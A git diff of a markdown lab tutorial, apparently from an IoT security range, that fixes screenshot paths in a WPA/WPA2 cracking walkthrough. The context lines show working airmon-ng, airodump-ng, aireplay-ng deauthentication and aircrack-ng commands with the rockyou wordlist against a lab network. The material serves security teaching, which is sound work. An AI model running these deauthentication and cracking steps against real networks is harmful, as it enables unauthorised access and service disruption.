@@ -11,7 +11,7 @@ WIFI Brute Force/Dictionary Attack
 # Description
 
 ## WPA/WPA2 4 Way Handshake
-![Screenshot](https://github.com/CRLTeam/IoTRange/blob/main/images/WIFI%20Cracking/image11.png?raw=true)
+![Screenshot](https://github.com/CRLTeam/IoTRange/blob/main/images/wifi-cracking/image11.png?raw=true)
 
 WPA2 has three main key types:
 
@@ -115,17 +115,20 @@ In this stage, we are bringing the interface down (AKA turning it off), setting 
 `sudo airmon-ng`
 `sudo airmon-ng check`
 `sudo airmon-ng check kill`
+![Screenshot](https://github.com/CRLTeam/IoTRange/blob/main/images/wifi-cracking/image1.png?raw=true)
 
 `sudo airmon-ng start wlan0`
 `sudo iwconfig`
 
 If successful, we will now see a new WLAN interface called wlan0mon on the Raspberry Pi.
+![Screenshot](https://github.com/CRLTeam/IoTRange/blob/main/images/wifi-cracking/image3.png?raw=true)
 
 ## See networks
 
 We are trying to crack the Basketball network. 
 
 `sudo airodump-ng wlan0mon`
+![Screenshot](https://github.com/CRLTeam/IoTRange/blob/main/images/wifi-cracking/image10.png?raw=true)
 
 **Note down the BSSID (AP MAC address) and CH(chanel) of desired network.**
 
@@ -134,6 +137,7 @@ We are trying to crack the Basketball network.
 ## Isolate target network and find MAC of device connected to it
 
 `sudo airodump-ng wlan0mon -d 42:5F:9A:87:81:F5`
+![Screenshot](https://github.com/CRLTeam/IoTRange/blob/main/images/wifi-cracking/image2.png?raw=true)
 
 
 In the top BSSID section, we see the Access Point MAC address and ESSID.
@@ -149,6 +153,7 @@ The file dump will usually be dumped in the same folder you run the command from
 Keep this command running while you deauthenticate the Client from the AP in a new window
 
 `sudo airodump-ng -w handshakedump -c 1 --bssid 42:5F:9A:87:81:F5 wlan0mon`
+![Screenshot](https://github.com/CRLTeam/IoTRange/blob/main/images/wifi-cracking/image5.png?raw=true)
 
 ## In a new window, deauthenticate/disconnect the Client/Station device from the network
 
@@ -156,6 +161,7 @@ open new window for this
 we now send broadcast Deauth packets to the AP
 `sudo aireplay-ng --deauth 0 -a 42:5F:9A:87:81:F5 wlan0mon`
 
+![Screenshot](https://github.com/CRLTeam/IoTRange/blob/main/images/wifi-cracking/image7.png?raw=true)
 
 
 You will see the Client/Station device, also known as the Laptop, disconnect from the network and reconnect.
@@ -180,6 +186,7 @@ or
 `sudo iwconfig wlan0mon channel 11`
 
 ## Confirm Handshake Capture
+![Screenshot](https://github.com/CRLTeam/IoTRange/blob/main/images/wifi-cracking/image8.png?raw=true)
 
 
 If the Deauthentication attack is successful, we will see the handshake captured here.
@@ -191,13 +198,15 @@ Using the Linux command
 `ls`
 
 we can see the list of files in the current directory
+![Screenshot](https://github.com/CRLTeam/IoTRange/blob/main/images/wifi-cracking/image9.png?raw=true)
 
 Here we see all the files associated with the capture, including the one ending in .cap, which is our captured handshake.
 
 ## Cracking the captured handshake with Aircrack-ng
 
-Unzip the rockyou.txt file
+### Unzip the rockyou.txt file
 We will be using a text file called rockyou.txt. This contains the dictionary for our dictionary attack. Because text files are easily compressible, rockyou.txt is typically compressed to save space unless people need it.
+![Screenshot](https://github.com/CRLTeam/IoTRange/blob/main/images/wifi-cracking/image6.png?raw=true)
 
 `sudo gunzip /usr/share/wordlists/rockyou.txt.gz`
 
@@ -220,6 +229,7 @@ is the -w flag for wordlist, and the directory of the wordlist.
 If you are ever confused about the full path of the directory you are in, use command ‘pwd’ to see the full path.
 
 ### The handshake is cracked!
+![Screenshot](https://github.com/CRLTeam/IoTRange/blob/main/images/wifi-cracking/image4.png?raw=true)
 
 
 We can see that the handshake was successfully cracked, and the password is ‘basketball’
